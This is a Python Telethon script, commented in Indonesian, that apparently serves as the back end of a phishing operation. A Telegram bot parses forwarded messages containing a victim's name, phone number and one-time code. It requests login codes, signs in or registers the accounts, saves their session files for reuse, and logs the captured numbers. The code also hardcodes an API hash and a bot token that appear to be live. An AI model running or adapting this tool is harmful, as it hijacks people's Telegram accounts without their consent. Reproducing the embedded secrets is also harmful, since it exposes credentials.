import asyncio
import os
import re
import time
from telethon import TelegramClient, events, errors

# Setting konfigurasi
api_id = 29564591
api_hash = '99d943dcb43f77dd61c9b020105a541b'
bot_token = '7621100011:AAGFxJa8g1kjtBkfc4hiwZESYSDAbncItjU'

# Setting tambahan
MAX_CONCURRENT_LOGINS = 10
OTP_TIMEOUT_SECONDS = 180

# Inisialisasi bot
bot = TelegramClient('bot_session', api_id, api_hash)

# Data login
pending_sessions = {}
otp_queue = asyncio.Queue()
semaphore = asyncio.Semaphore(MAX_CONCURRENT_LOGINS)

# Folder session dan log
session_folder = "sessions"
os.makedirs(session_folder, exist_ok=True)
log_registered = "registered.txt"
log_new_registered = "new_registered.txt"

# ------- FUNGSI -------

async def request_otp(phone_number, first_name, last_name):
    session_name = os.path.join(session_folder, phone_number.replace("+", ""))
    client = TelegramClient(session_name, api_id, api_hash)
    await client.connect()

    try:
        if await client.is_user_authorized():
            print(f"✅ {phone_number} sudah login sebelumnya.")
            await client.disconnect()
            return

        print(f"📨 Meminta OTP untuk {phone_number}")
        sent = await client.send_code_request(phone_number)
        phone_code_hash = sent.phone_code_hash

        pending_sessions[phone_number] = {
            'session_path': session_name,
            'request_time': time.time(),
            'phone_code_hash': phone_code_hash,
            'first_name': first_name,
            'last_name': last_name
        }

    except errors.PhoneNumberUnoccupiedError:
        print(f"📵 Nomor {phone_number} belum terdaftar, lanjut daftar.")
        pending_sessions[phone_number] = {
            'session_path': session_name,
            'request_time': time.time(),
            'phone_code_hash': None,
            'first_name': first_name,
            'last_name': last_name
        }
    except errors.PhoneNumberInvalidError:
        print(f"❌ Nomor tidak valid: {phone_number}")
    except Exception as e:
        print(f"❌ Error request OTP {phone_number}: {e}")
    finally:
        await client.disconnect()

async def login_with_otp(phone_number, otp_code):
    async with semaphore:
        if phone_number not in pending_sessions:
            print(f"⚠️ Tidak ada pending session untuk {phone_number}. Abaikan OTP.")
            return

        session_info = pending_sessions.pop(phone_number)
        session_name = session_info['session_path']
        client = TelegramClient(session_name, api_id, api_hash)
        await client.connect()

        try:
            print(f"🔐 Login {phone_number} dengan OTP {otp_code}")
            phone_code_hash = session_info['phone_code_hash']
            first_name = session_info['first_name']
            last_name = session_info['last_name']

            if phone_code_hash:
                await client.sign_in(phone_number, otp_code)
                print(f"✅ Akun lama login sukses: {phone_number}")
                await log_result(log_registered, phone_number)
            else:
                await client.sign_up(code=otp_code, first_name=first_name, last_name=last_name)
                print(f"🎉 Akun baru berhasil daftar: {phone_number}")
                await log_result(log_new_registered, phone_number)

        except errors.PhoneCodeInvalidError:
            print(f"❗ OTP salah untuk {phone_number}")
            await safe_delete_session(client, session_name)
        except errors.SessionPasswordNeededError:
            print(f"🔒 Akun {phone_number} butuh password 2FA.")
            await log_result(log_registered, phone_number)
        except errors.PhoneCodeExpiredError:
            print(f"⌛ OTP expired untuk {phone_number}")
            await safe_delete_session(client, session_name)
        except Exception as e:
            print(f"❌ Error saat login {phone_number}: {e}")
            await safe_delete_session(client, session_name)
        finally:
            await client.disconnect()

async def safe_delete_session(client, session_base_path):
    if client.is_connected():
        await client.disconnect()
    await asyncio.sleep(0.5)
    for ext in ["", "-journal"]:
        path = f"{session_base_path}.session{ext}"
        if os.path.exists(path):
            try:
                os.remove(path)
                print(f"🗑️ Session corrupt dihapus: {path}")
            except Exception as e:
                print(f"⚠️ Gagal hapus session {path}: {e}")

async def log_result(filename, phone_number):
    async with asyncio.Lock():
        with open(filename, "a") as f:
            f.write(f"{phone_number}\n")

async def otp_queue_processor():
    while True:
        phone_number, otp_code = await otp_queue.get()
        await login_with_otp(phone_number, otp_code)
        otp_queue.task_done()

async def timeout_checker():
    while True:
        now = time.time()
        expired = [phone for phone, data in pending_sessions.items() if now - data['request_time'] > OTP_TIMEOUT_SECONDS]
        for phone in expired:
            print(f"⌛ Timeout OTP untuk {phone}")
            session_path = pending_sessions[phone]['session_path']
            await safe_delete_session(TelegramClient(session_path, api_id, api_hash), session_path)
            pending_sessions.pop(phone, None)
        await asyncio.sleep(5)

@bot.on(events.NewMessage)
async def handler(event):
    text = event.raw_text

    phone_only_match = re.search(
        r'FULL NAME\s*:\s*(.+?)\s*PHONE NUMBER\s*:\s*(\+\d+)(?!.*OTP)',
        text, re.IGNORECASE | re.DOTALL
    )
    otp_match = re.search(
        r'FULL NAME\s*:\s*(.+?)\s*PHONE NUMBER\s*:\s*(\+\d+).*?OTP\s*:\s*(\d+)',
        text, re.IGNORECASE | re.DOTALL
    )

    if phone_only_match:
        full_name = phone_only_match.group(1).strip()
        phone_number = phone_only_match.group(2).strip()
        names = full_name.split(' ', 1)
        first_name = names[0]
        last_name = names[1] if len(names) > 1 else '-'
        print(f"📥 Ditemukan nomor baru: {phone_number}")
        await request_otp(phone_number, first_name, last_name)

    elif otp_match:
        full_name = otp_match.group(1).strip()
        phone_number = otp_match.group(2).strip()
        otp_code = otp_match.group(3).strip()
        print(f"📩 Ditemukan OTP {otp_code} untuk {phone_number}")
        await otp_queue.put((phone_number, otp_code))

async def main():
    await bot.start(bot_token=bot_token)
    print("🤖 Bot FINAL5 FIX AKTIF...")
    asyncio.create_task(timeout_checker())
    asyncio.create_task(otp_queue_processor())
    await bot.run_until_disconnected()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("🚪 Exit manual oleh user...")
